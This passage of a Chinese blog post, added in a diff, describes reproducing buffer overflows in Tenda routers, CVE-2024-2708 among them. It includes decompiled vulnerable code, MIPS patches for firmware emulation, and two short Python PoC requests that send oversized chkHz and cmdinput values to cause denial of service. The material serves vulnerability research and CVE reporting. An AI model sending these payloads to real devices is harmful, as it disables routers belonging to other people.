+</span></span><span style="display:flex;"><span>    v1 <span style="color:#ff79c6">=</span> sub_4716B0(v62, <span style="color:#f1fa8c">&#34;wds.bdg.limit&#34;</span>, v66);
+</span></span><span style="display:flex;"><span>    GetValue(v1, v33);
+</span></span><span style="display:flex;"><span>    v2 <span style="color:#ff79c6">=</span> sub_4716B0(v62, <span style="color:#f1fa8c">&#34;workmode&#34;</span>, v66);
+</span></span><span style="display:flex;"><span>    GetValue(v2, v59);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>strcmp(v59, <span style="color:#f1fa8c">&#34;sta&#34;</span>) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      Var <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;wisp&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>strcmp(v59, <span style="color:#f1fa8c">&#34;wet&#34;</span>) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      Var <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;apclient&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>strcmp((<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)v33, <span style="color:#f1fa8c">&#34;1&#34;</span>) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      Var <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;wds&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      Var <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;ap&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  strcat(v60, chkHz);   <span style="color:#6272a4">// BUG: not check size lead to bufffer overflow
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  strcat(v60, <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\r</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
+</span></span></code></pre></div><p>PoC 导致DoS</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>import requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;192.168.85.143&#34;</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://&#34;</span> <span style="color:#ff79c6">+</span> ip <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/goform/WrlExtraGet&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;chkHz&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;a&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x4000</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> requests.post(url, data<span style="color:#ff79c6">=</span>data)
+</span></span><span style="display:flex;"><span>print(response.text)
+</span></span></code></pre></div><h2 id="ac10u-v10">AC10U v1.0</h2>
+<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2708">CVE-2024-2708</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>A vulnerability was found in Tenda AC10U 15.03.06.49 and classified as critical. This issue affects the function formexeCommand of the file /goform/execCommand. The manipulation of the argument cmdinput leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-257459. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.
+</span></span></code></pre></div><p>下载固件，测试。<a href="https://www.tendacn.com/download/detail-3795.html">AC10U v1.0 Firmware</a></p>
+<p>依然是MIPS LSB，patch 3处</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// 1
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>lw      $gp, <span style="color:#bd93f9">0x138</span><span style="color:#ff79c6">+</span>var_120($fp)
+</span></span><span style="display:flex;"><span>la      $v0, apmib_init
+</span></span><span style="display:flex;"><span>move    $t9, $v0
+</span></span><span style="display:flex;"><span>li      $v0, <span style="color:#bd93f9">1</span>           # Keypatch modified <span style="color:#ff79c6">this</span> <span style="color:#8be9fd;font-style:italic">from</span>:
+</span></span><span style="display:flex;"><span>                         <span style="color:#ff79c6">#   jalr $t9 # apmib_init
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>nop                      # Keypatch modified <span style="color:#ff79c6">this</span> <span style="color:#8be9fd;font-style:italic">from</span>:
+</span></span><span style="display:flex;"><span>                         <span style="color:#ff79c6">#   nop
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 2
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>addiu   $v0, $fp, <span style="color:#bd93f9">0x138</span><span style="color:#ff79c6">+</span>ipbuf
+</span></span><span style="display:flex;"><span>move    $a0, $v0
+</span></span><span style="display:flex;"><span>la      $v0, check_network
+</span></span><span style="display:flex;"><span>move    $t9, $v0
+</span></span><span style="display:flex;"><span>li      $v0, <span style="color:#bd93f9">1</span>           # Keypatch modified <span style="color:#ff79c6">this</span> <span style="color:#8be9fd;font-style:italic">from</span>:
+</span></span><span style="display:flex;"><span>                         <span style="color:#ff79c6">#   jalr $t9 # check_network
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>nop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 3
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>la      $v0, sleep
+</span></span><span style="display:flex;"><span>move    $t9, $v0
+</span></span><span style="display:flex;"><span>jalr    $t9  # sleep
+</span></span><span style="display:flex;"><span>nop
+</span></span><span style="display:flex;"><span>lw      $gp, <span style="color:#bd93f9">0x138</span><span style="color:#ff79c6">+</span>var_120($fp)
+</span></span><span style="display:flex;"><span>la      $v0, ConnectCfm
+</span></span><span style="display:flex;"><span>move    $t9, $v0
+</span></span><span style="display:flex;"><span>li      $v0, <span style="color:#bd93f9">1</span>           # Keypatch modified <span style="color:#ff79c6">this</span> <span style="color:#8be9fd;font-style:italic">from</span>:
+</span></span><span style="display:flex;"><span>                         <span style="color:#ff79c6">#   jalr $t9 # ConnectCfm
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>nop                      # Keypatch modified <span style="color:#ff79c6">this</span> <span style="color:#8be9fd;font-style:italic">from</span>:
+</span></span><span style="display:flex;"><span>                         <span style="color:#ff79c6">#   nop
+</span></span></span></code></pre></div><p>测试溢出</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;192.168.84.101&#34;</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">/goform/execCommand&#34;</span><span style="color:#ff79c6">%</span>ip
+</span></span><span style="display:flex;"><span>cookie <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;Cookie&#34;</span>:<span style="color:#f1fa8c">&#34;cmdinput=&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">1000</span>}
+</span></span><span style="display:flex;"><span>ret <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url<span style="color:#ff79c6">=</span>url,cookies<span style="color:#ff79c6">=</span>cookie)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(ret<span style="color:#ff79c6">.</span>text)
+</span></span></code></pre></div><p>复现时？看了一眼，没注册路由？？？</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;html&gt;&lt;head&gt;&lt;title&gt;Document Error: Data follows&lt;/title&gt;&lt;/head&gt;
+</span></span><span style="display:flex;"><span>		&lt;body&gt;&lt;h2&gt;Access Error: Data follows&lt;/h2&gt;
+</span></span><span style="display:flex;"><span>		&lt;p&gt;Form exeCommand is not defined&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></div><h2 id="cve申请">CVE申请</h2>
+<p>这些产品 <code>unsupported</code>，因此公布没什么问题， 直接向CVE网站报告就行</p>
+<ul>
+<li>这里需要注意，正在卖钱的产品最好还是向官方报告。</li>
+</ul>
+<p>参考这篇文章就行：<a href="https://www.sqlsec.com/2021/06/cve.html#%E7%BC%96%E5%86%99%E7%BB%86%E8%8A%82">水一篇文章：如何水一个 CVE</a></p>
+<p>申请了两个CVE（等待了两个星期）</p>
+<ul>
+<li>CVE-2024-44858</li>
+<li>CVE-2024-44859</li>
+</ul>
+<p>以后多看看新出的CVE，看看能不能捡漏😋</p>
+<p>刷CVE找很久没更新的并且有点年代感的固件，狠狠的刷🥵</p>
+<ul>
+<li>httpd</li>
+<li>cgi</li>
+<li>WEB 服务</li>
+</ul>
+<p>并且做IoT还是得需要硬件支持，否则测试蛮难受的。<del>焊板子挺有趣，但是我只是个穷学生😭，还是用qemu</del></p>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			
+		</div>
+		<div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        var disqus_shortname = 'ldrx30';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+
+</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © ldrx30 |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
